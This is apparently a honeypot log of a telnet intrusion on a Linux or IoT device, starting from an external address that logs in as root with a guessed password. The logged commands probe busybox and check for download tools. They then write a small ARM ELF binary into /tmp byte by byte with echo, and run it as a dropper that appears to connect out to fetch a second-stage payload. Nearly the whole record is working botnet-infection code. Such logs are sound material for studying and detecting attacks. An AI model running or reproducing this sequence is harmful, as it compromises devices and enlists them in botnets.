from: 109.105.251.136:50467 user:root password:klv1234
enable
system
shell
sh
cat /proc/mounts; /bin/busybox FXBCP
cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox FXBCP
tftp; wget; /bin/busybox FXBCP
dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
/bin/busybox FXBCP
>.s; cp .s .i
echo -ne "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x54\x00\x01\x00\x34\x00\x00\x00\x40\x01\x00\x00\x00\x02\x00\x05\x34\x00\x20\x00\x01\x00\x28\x00\x04\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00" >> .s
echo -ne "\x00\x00\x01\x00\xf8\x00\x00\x00\xf8\x00\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x06\x20\xa0\xe3\x07\x00\x2d\xe9\x01\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x0c\xd0\x8d\xe2\x00\x60\xa0\xe1\x70\x10\x8f\xe2\x10\x20\xa0\xe3" >> .s
echo -ne "\x07\x00\x2d\xe9\x03\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x14\xd0\x8d\xe2\x4f\x4f\x4d\xe2\x05\x50\x45\xe0\x06\x00\xa0\xe1\x04\x10\xa0\xe1\x4b\x2f\xa0\xe3\x01\x3c\xa0\xe3\x0f\x00\x2d\xe9\x0a\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x10\xd0\x8d\xe2" >> .s
echo -ne "\x00\x50\x85\xe0\x00\x00\x50\xe3\x04\x00\x00\xda\x00\x20\xa0\xe1\x01\x00\xa0\xe3\x04\x10\xa0\xe1\x04\x00\x90\xef\xee\xff\xff\xea\x4f\xdf\x8d\xe2\x00\x00\x40\xe0\x01\x70\xa0\xe3\x00\x00\x00\xef\x02\x00\x1a\x5f\xab\xfa\x78\x76\x41\x26\x00\x00\x00\x61\x65\x61" >> .s
echo -ne "\x62\x69\x00\x01\x1c\x00\x00\x00\x05\x43\x6f\x72\x74\x65\x78\x2d\x41\x35\x00\x06\x0a\x07\x41\x08\x01\x09\x02\x2a\x01\x44\x01\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x41\x52\x4d\x2e\x61\x74\x74\x72\x69\x62\x75\x74\x65\x73\x00" >> .s
echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x54\x00\x01\x00\x54\x00\x00\x00\xa4\x00\x00\x00" >> .s
echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\xf8\x00\x00\x00\x27\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00" >> .s
echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x01\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" >> .s
./.s>.i; chmod 777 .i; ./.i; rm .s; exit
q
[eof]